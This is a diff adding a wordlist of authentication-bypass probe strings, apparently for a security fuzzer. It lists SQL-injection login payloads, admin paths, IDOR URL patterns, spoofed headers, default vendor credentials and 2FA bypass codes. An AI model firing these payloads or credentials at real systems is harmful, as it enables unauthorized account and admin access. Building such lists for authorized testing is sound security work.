@@ -1,0 +1,198 @@
+# category: auth-bypass
+# description: Classic auth-bypass / login / 2FA / IDOR probe strings.
+# references: HackTricks Auth Bypass, PortSwigger Authentication labs.
+
+admin
+Admin
+ADMIN
+administrator
+root
+superuser
+guest
+test
+user
+system
+admin:admin
+admin:password
+admin:12345
+admin:changeme
+admin:admin123
+admin:' OR '1'='1
+admin@example.com
+admin@admin.com
+admin'--
+admin'#
+admin'/*
+' OR '1'='1
+'OR 1=1--
+"OR 1=1--
+' OR username LIKE 'a%
+' OR '' = '
+admin') OR ('1'='1
+' UNION SELECT 1,'admin','admin',1--
+/admin
+/administrator
+/admin/
+/admin/login
+/admin/index
+/admin.php
+/admin.html
+/admin.jsp
+/admin.aspx
+/wp-admin
+/wp-admin/
+/wp-login.php
+/manage
+/dashboard
+/console
+/panel
+/cpanel
+/portal
+/control
+/secure
+/private
+/internal
+/api/admin
+/api/v1/admin
+/api/v1/users
+/api/v1/me
+/api/v1/.../admin
+/user/1
+/user/0
+/user/-1
+/users/1
+/users/2
+/users/me
+/users/current
+/account/1
+/profile?id=1
+/profile?id=2
+/profile?id=0
+/profile?id=-1
+/profile?id=../admin
+/profile?userid=1
+/profile?account=admin
+/profile?uid=1
+?role=admin
+?role=administrator
+?role=super
+?is_admin=1
+?is_admin=true
+?admin=1
+?admin=true
+?debug=1
+?debug=true
+?test=1
+?dev=1
+?impersonate=admin
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Override-URL: /admin
+Referer: /admin
+Referer: https://victim.test/admin
+X-Admin: 1
+X-Role: admin
+X-User-Role: admin
+Authorization: Bearer null
+Authorization: Bearer undefined
+Authorization: Basic Og==
+
+# ── Default creds (manufacturer / framework-specific) ────────────────────
+tomcat:tomcat
+tomcat:s3cret
+admin:tomcat
+jenkins:jenkins
+jenkins:admin
+postgres:postgres
+root:root
+root:toor
+root:password
+root:raspberry
+pi:raspberry
+user:user
+oracle:oracle
+system:oracle
+sa:sa
+sa:
+mysql:mysql
+guest:guest
+test:test
+demo:demo
+cisco:cisco
+ubnt:ubnt
+admin:1234
+admin:12345
+admin:123456
+admin:12345678
+admin:qwerty
+admin:password1
+admin:P@ssw0rd
+admin:letmein
+admin:welcome
+admin:Admin@123
+root:admin
+admin:system
+admin:default
+admin:changeme
+admin:camio
+operator:operator
+superadmin:superadmin
+support:support
+test:1234
+
+# ── API key / token prefixes to try as noops ─────────────────────────────
+Bearer undefined
+Bearer null
+Bearer 0
+Bearer false
+Bearer [object Object]
+Bearer test
+Bearer test-token
+Bearer placeholder
+X-API-Key: test
+X-API-Key: null
+X-API-Key: 00000000-0000-0000-0000-000000000000
+X-API-Key: aaaa-bbbb-cccc-dddd
+
+# ── IDOR patterns (numeric + UUID + encoded) ─────────────────────────────
+/api/v1/users/1
+/api/v1/users/0
+/api/v1/users/-1
+/api/v1/users/00000000-0000-0000-0000-000000000000
+/api/v1/users/ffffffff-ffff-ffff-ffff-ffffffffffff
+/api/v1/users/me
+/api/v1/users/current
+/api/v1/users/self
+/api/v1/users/admin
+/api/v1/users/root
+/api/v1/users/0001
+/api/v1/users/MDAwMDAwMDAw
+/api/v1/users/%00
+/api/v1/account?id[]=1
+/api/v1/account?id[]=1&id[]=2
+/api/v1/account?user_id=1&account_id=999
+
+# ── Method-override to reach PUT/DELETE through POST ─────────────────────
+X-HTTP-Method: PUT
+X-HTTP-Method: DELETE
+X-HTTP-Method: PATCH
+X-HTTP-Method-Override: PUT
+X-Method-Override: DELETE
+_method=PUT
+_method=DELETE
+_method=PATCH
+
+# ── 2FA / step-up bypass hints ───────────────────────────────────────────
+/api/auth/2fa/verify
+/api/auth/2fa/skip
+/api/auth/mfa/verify
+/api/auth/mfa/bypass
+/api/auth/recover
+/api/auth/password-reset/confirm?token=null
+/api/auth/password-reset/confirm?token=undefined
+mfa_code=000000
+mfa_code=111111
+mfa_code=123456
+mfa_code=
+mfa_code=null
